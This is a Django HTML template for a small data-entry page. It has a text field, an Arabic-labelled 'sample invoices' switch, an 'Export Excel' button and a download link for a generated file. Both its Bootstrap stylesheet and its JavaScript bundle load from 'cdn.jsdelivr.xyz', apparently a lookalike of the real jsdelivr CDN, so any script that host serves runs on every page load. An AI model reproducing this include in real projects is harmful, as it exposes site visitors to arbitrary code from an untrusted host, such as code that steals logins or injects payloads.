{% load static %}
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <title>Home</title>
  </head>
  <body>
    <div class="container mt-5">
      <form action="" method="get">
        <div class="row">
          <div class="col-sm-6">
            <input
              name="dataInput"
              type="text"
              class="form-control"
              id="dataInput"
              placeholder="Enter your data"
              value="{{ input_data }}"
            />
          </div>
          <div class="form-check form-switch col-sm-2">
            <input
              class="form-check-input"
              type="checkbox"
              role="switch"
              id="flexSwitchCheckChecked"
              name="samples"
              checked
            />
            <label class="form-check-label" for="flexSwitchCheckChecked"
              >فواتير عينات</label
            >
          </div>
          <div class="col-sm-4">
            <button class="btn btn-primary" type="submit">Export Excel</button>
          </div>
        </div>
      </form>
    </div>
    {% if input_data %}
    <div class="container">
      <div class="mt-3 text-center">
        <div class="card bg-light fs-4">
          <div class="card-body">
            You entered: {{ input_data }} {{ sample_data }}
          </div>

          <div class="card-header">
            <a href="{% static fileName %}" download class="btn btn-success"
              >Download File For this Code
            </a>
          </div>
        </div>
      </div>
    </div>
    {% endif %}

    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
